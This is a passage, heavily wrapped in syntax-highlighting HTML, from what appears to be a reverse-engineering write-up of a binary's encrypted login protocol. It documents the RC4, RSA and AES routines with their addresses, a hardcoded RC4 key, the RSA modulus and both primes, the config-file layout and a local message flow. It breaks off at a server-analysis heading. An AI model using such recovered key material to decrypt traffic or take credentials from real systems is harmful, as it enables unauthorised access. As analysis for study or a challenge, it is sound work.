class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br><span class="hljs-number">1.</span> RC4 (Stream Cipher)<br>   <span class="hljs-operator">-</span> Key: &quot;qwertyui&quot; (<span class="hljs-number">8</span> bytes, used twice <span class="hljs-operator">=</span> <span class="hljs-number">16</span> bytes <span class="hljs-keyword">for</span> key schedule)<br>   <span class="hljs-operator">-</span> Functions:<br>     <span class="hljs-operator">*</span> rc4_ksa (<span class="hljs-number">0x4AF9</span>): Key Scheduling Algorithm<br>     <span class="hljs-operator">*</span> rc4_prga (<span class="hljs-number">0x4C23</span>): Pseudo<span class="hljs-operator">-</span>Random Generation Algorithm<br>     <span class="hljs-operator">*</span> rc4_decrypt (<span class="hljs-number">0x4D4A</span>): Decrypt received data<br>     <span class="hljs-operator">*</span> rc4_encrypt_and_send (<span class="hljs-number">0x2729</span>): Encrypt <span class="hljs-keyword">and</span> send data<br>   <span class="hljs-operator">-</span> Usage: <span class="hljs-keyword">ALL</span> network traffic <span class="hljs-keyword">is</span> RC4 encrypted<span class="hljs-operator">/</span>decrypted<br><br><span class="hljs-number">2.</span> RSA (<span class="hljs-keyword">Asymmetric</span> Encryption)<br>   <span class="hljs-operator">-</span> Key parameters (<span class="hljs-keyword">all</span> <span class="hljs-keyword">in</span> hex):<br>     <span class="hljs-operator">*</span> n: <span class="hljs-number">9</span>a49428cadd84b7a81cb80f916e645a6a9dd23c2fe679f93af6a77eff0f0bb13<br>          <span class="hljs-number">09</span>b77fb7861275f07ab41e98ae5c2ecf933f27d47b9ce0a55a3e06569cacbb4c<br>          <span class="hljs-number">9183</span>f8ee9a47f2cfbb3a5965c9326f45d2d608cfeabea1a1879eae95b70224d2<br>          e7736b9bc4109756f55a3f70f11a9b9c6564fb6456d329c336fbb59859db5fde<br>          <span class="hljs-number">1</span>f2338294e863c4f05b4a89e6c3b761d52a2081a0af0a320fde831daa741fad7<br>          <span class="hljs-number">7</span>aa7ef2dd30b3e33d1a6e7b44ed44ef40de4557a4fd65b63db63d105386bbd81<br>          <span class="hljs-number">071739</span>ec3d0fe44b6a0952a2b065bededfecea6e22229fea32adfc9a6e2ccfdf<br>          <span class="hljs-number">5</span>da437a56ad41d7ef08c2c4635d3a0218aab2a5ed6e9dd42d684bc918efe24d3<br>     <span class="hljs-operator">*</span> e: <span class="hljs-number">10001</span> (<span class="hljs-number">65537</span>)<br>     <span class="hljs-operator">*</span> p: b782eca6a75067d398dd8ef00e9d024cc554f292d7820a72848d3c619dafaf61<br>          ab8f7d719d4cd8ac44351281afd64f8cf23bc8aa5ec48bbd9eb301af50b96f52<br>          <span class="hljs-number">8</span>a108e6643223130a84addd5b9e1ad108c44d706adc5fb097a17ab990f395f37<br>          <span class="hljs-number">81296e356</span>ac60d64b9a2a641c3e2f593bbe98d38df528a1c67e583ef623b667f<br>     <span class="hljs-operator">*</span> q: d73b03a9b0c4b7e9236d56938d6264e6c8ecaab709effcf02f4e5ec26310273b<br>          <span class="hljs-number">81089e1</span>cb3d4c050e852721d3daf1d5b7a2be2df02bafcffb77e17d1a8e6428b<br>          f87579c859cbe778d3b9ea93aff0d934a0e7b83a1d7a39d0a1779ea18db5fffd<br>          <span class="hljs-number">99</span>b118c4c2361a22308f54f7ae568e7bf2de6d1b6eb0be1d77eca8edd94f9fad<br>     <span class="hljs-operator">*</span> d: <span class="hljs-number">0</span> (<span class="hljs-keyword">not</span> used <span class="hljs-keyword">by</span> client, <span class="hljs-keyword">only</span> server needs private key)<br>   <span class="hljs-operator">-</span> Padding: PKCS1 OAEP (RSA_PKCS1_OAEP_PADDING <span class="hljs-operator">=</span> <span class="hljs-number">4</span>)<br>   <span class="hljs-operator">-</span> Functions:<br>     <span class="hljs-operator">*</span> hex_str_to_bn (<span class="hljs-number">0x4E1C</span>): <span class="hljs-keyword">Convert</span> hex string <span class="hljs-keyword">to</span> BIGNUM<br>     <span class="hljs-operator">*</span> rsa_create_key (<span class="hljs-number">0x4E86</span>): <span class="hljs-keyword">Create</span> RSA key structure<br>     <span class="hljs-operator">*</span> rsa_public_encrypt (<span class="hljs-number">0x4F70</span>): RSA public key encryption<br>     <span class="hljs-operator">*</span> rsa_encrypt_with_keys (<span class="hljs-number">0x5042</span>): Complete RSA encryption wrapper<br>   <span class="hljs-operator">-</span> Usage: Encrypt AES key <span class="hljs-keyword">and</span> IV before sending <span class="hljs-keyword">to</span> server<br><br><span class="hljs-number">3.</span> AES<span class="hljs-number">-128</span><span class="hljs-operator">-</span>CBC (<span class="hljs-keyword">Symmetric</span> Encryption)<br>   <span class="hljs-operator">-</span> Key size: <span class="hljs-number">16</span> bytes<br>   <span class="hljs-operator">-</span> Block size: <span class="hljs-number">16</span> bytes<br>   <span class="hljs-operator">-</span> Rounds: <span class="hljs-number">10</span><br>   <span class="hljs-operator">-</span> Functions:<br>     <span class="hljs-operator">*</span> aes_key_expansion (<span class="hljs-number">0x33F6</span>): Expand <span class="hljs-number">16</span><span class="hljs-operator">-</span>byte key <span class="hljs-keyword">to</span> round keys<br>     <span class="hljs-operator">*</span> aes_sub_bytes (<span class="hljs-number">0x37D2</span>): S<span class="hljs-operator">-</span>box substitution<br>     <span class="hljs-operator">*</span> aes_shift_rows (<span class="hljs-number">0x38D8</span>): <span class="hljs-type">Row</span> shifting<br>     <span class="hljs-operator">*</span> aes_mix_columns (<span class="hljs-number">0x3CB1</span>): <span class="hljs-keyword">Column</span> mixing<br>     <span class="hljs-operator">*</span> aes_add_round_key (<span class="hljs-number">0x36C5</span>): XOR <span class="hljs-keyword">with</span> round key<br>     <span class="hljs-operator">*</span> aes_state_from_buffer (<span class="hljs-number">0x3323</span>): Load state matrix <span class="hljs-keyword">from</span> buffer<br>     <span class="hljs-operator">*</span> aes_state_to_buffer (<span class="hljs-number">0x338C</span>): Store state matrix <span class="hljs-keyword">to</span> buffer<br>     <span class="hljs-operator">*</span> aes_cbc_encrypt (<span class="hljs-number">0x4125</span>): CBC mode encryption<br>     <span class="hljs-operator">*</span> aes_cbc_encrypt_password (<span class="hljs-number">0x49DD</span>): Encrypt password <span class="hljs-keyword">with</span> PKCS7 padding<br>     <span class="hljs-operator">*</span> pkcs7_pad (<span class="hljs-number">0x48ED</span>): PKCS7 padding<br>     <span class="hljs-operator">*</span> calc_padded_len (<span class="hljs-number">0x49A4</span>): Calculate padded length<br>   <span class="hljs-operator">-</span> Usage: Encrypt password <span class="hljs-keyword">for</span> transmission<br><br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>                          CONFIG FILE STRUCTURE<br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br>File: config (<span class="hljs-number">88</span> bytes total)<br>Content: &quot;key:xxxxxxxxxxxxxxxxiv:xxxxxxxxxxxxxxxxpasswd:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;<br><br><span class="hljs-keyword">Offset</span>  Length  Field       Description<br><span class="hljs-comment">------  ------  ----------  ------------------------------------------</span><br><span class="hljs-number">0</span>       <span class="hljs-number">4</span>       label       &quot;key:&quot; (literal)<br><span class="hljs-number">4</span>       <span class="hljs-number">16</span>      aes_iv      AES IV (<span class="hljs-number">16</span> bytes), read <span class="hljs-keyword">when</span> server asks &quot;inp u key&quot;<br><span class="hljs-number">20</span>      <span class="hljs-number">3</span>       label       &quot;iv:&quot; (literal)<br><span class="hljs-number">23</span>      <span class="hljs-number">16</span>      aes_key     AES Key (<span class="hljs-number">16</span> bytes), read <span class="hljs-keyword">when</span> server asks &quot;inp u account&quot;<br><span class="hljs-number">39</span>      <span class="hljs-number">7</span>       label       &quot;passwd:&quot; (literal)<br><span class="hljs-number">46</span>      <span class="hljs-number">42</span>      password    Password (<span class="hljs-number">42</span> bytes), read <span class="hljs-keyword">when</span> server asks &quot;inp u passwd&quot;<br><br>read_config_file <span class="hljs-keyword">function</span> (<span class="hljs-number">0x5302</span>):<br>  <span class="hljs-operator">-</span> n<span class="hljs-operator">=</span><span class="hljs-number">0</span>: Read bytes <span class="hljs-number">4</span><span class="hljs-number">-19</span> (AES IV, <span class="hljs-number">16</span> bytes)<br>  <span class="hljs-operator">-</span> n<span class="hljs-operator">=</span><span class="hljs-number">1</span>: Read bytes <span class="hljs-number">23</span><span class="hljs-number">-38</span> (AES Key, <span class="hljs-number">16</span> bytes)<br>  <span class="hljs-operator">-</span> n<span class="hljs-operator">=</span><span class="hljs-number">2</span>: Read bytes <span class="hljs-number">46</span><span class="hljs-number">-87</span> (Password, <span class="hljs-number">42</span> bytes)<br><br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>                           PROTOCOL FLOW<br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br><span class="hljs-number">1.</span> Client connects <span class="hljs-keyword">to</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8080</span><br><br><span class="hljs-number">2.</span> Client <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Server: &quot;req login...&quot; (RC4 encrypted)<br><br><span class="hljs-number">3.</span> Server <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Client: &quot;inp u account&quot; (RC4 encrypted)<br><br><span class="hljs-number">4.</span> Client <span class="hljs-keyword">reads</span> AES KEY <span class="hljs-keyword">from</span> config (<span class="hljs-keyword">offset</span> <span class="hljs-number">23</span><span class="hljs-number">-38</span>, <span class="hljs-number">16</span> bytes)<br>   Client <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Server: RSA_encrypt(AES_KEY) <span class="hljs-keyword">then</span> RC4 encrypted<br>   <br><span class="hljs-number">5.</span> Server <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Client: &quot;inp u key&quot; (RC4 encrypted)<br><br><span class="hljs-number">6.</span> Client <span class="hljs-keyword">reads</span> AES IV <span class="hljs-keyword">from</span> config (<span class="hljs-keyword">offset</span> <span class="hljs-number">4</span><span class="hljs-number">-19</span>, <span class="hljs-number">16</span> bytes)<br>   Client <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Server: RSA_encrypt(AES_IV) <span class="hljs-keyword">then</span> RC4 encrypted<br><br><span class="hljs-number">7.</span> Server <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Client: &quot;inp u passwd&quot; (RC4 encrypted)<br><br><span class="hljs-number">8.</span> Client <span class="hljs-keyword">reads</span> password <span class="hljs-keyword">from</span> config (<span class="hljs-keyword">offset</span> <span class="hljs-number">46</span><span class="hljs-number">-87</span>, <span class="hljs-number">42</span> bytes)<br>   Client performs:<br>   <span class="hljs-operator">-</span> PKCS7 padding: <span class="hljs-number">42</span> bytes <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">48</span> bytes (pad <span class="hljs-keyword">with</span> <span class="hljs-number">6</span>x <span class="hljs-number">0x06</span>)<br>   <span class="hljs-operator">-</span> AES<span class="hljs-operator">-</span>CBC encrypt <span class="hljs-keyword">with</span> key<span class="hljs-operator">=</span>AES_KEY, iv<span class="hljs-operator">=</span>AES_IV<br>   Client <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Server: AES_encrypted_password (<span class="hljs-number">48</span> bytes, RC4 encrypted)<br><br><span class="hljs-number">9.</span> Server verifies <span class="hljs-keyword">and</span> responds:<br>   <span class="hljs-operator">-</span> &quot;login success&quot; if password correct<br>   <span class="hljs-operator">-</span> &quot;login error&quot; if password wrong<br><br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>                        IMPORTANT ADDRESSES<br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br><span class="hljs-keyword">Global</span> Variables:<br>  p_qwertyui (<span class="hljs-number">0x9020</span>): Pointer <span class="hljs-keyword">to</span> RC4 key &quot;qwertyui&quot;<br>  off_90A0: RSA modulus n<br>  off_90A8: RSA exponent e (&quot;10001&quot;)<br>  off_90B0: RSA prime p<br>  off_90B8: RSA prime q<br>  off_90C0: RSA private exponent d (&quot;0&quot; <span class="hljs-operator">-</span> <span class="hljs-keyword">not</span> used)<br>  byte_90E0: AES S<span class="hljs-operator">-</span>box<br>  dword_6500: AES round constants (Rcon)<br><br>Key Functions:<br>  main (<span class="hljs-number">0x27A0</span>): Main <span class="hljs-keyword">function</span>, login protocol<br>  rc4_encrypt_and_send (<span class="hljs-number">0x2729</span>): Encrypt <span class="hljs-keyword">with</span> RC4 <span class="hljs-keyword">and</span> send<br>  rc4_decrypt (<span class="hljs-number">0x4D4A</span>): Decrypt <span class="hljs-keyword">with</span> RC4<br>  rsa_encrypt_with_keys (<span class="hljs-number">0x5042</span>): RSA encryption<br>  aes_cbc_encrypt_password (<span class="hljs-number">0x49DD</span>): AES<span class="hljs-operator">-</span>CBC password encryption<br>  read_config_file (<span class="hljs-number">0x5302</span>): Read <span class="hljs-keyword">values</span> <span class="hljs-keyword">from</span> config<br>  string_compare (<span class="hljs-number">0x329B</span>): Compare strings<br><br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br>                         SERVER ANALYSIS<br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span 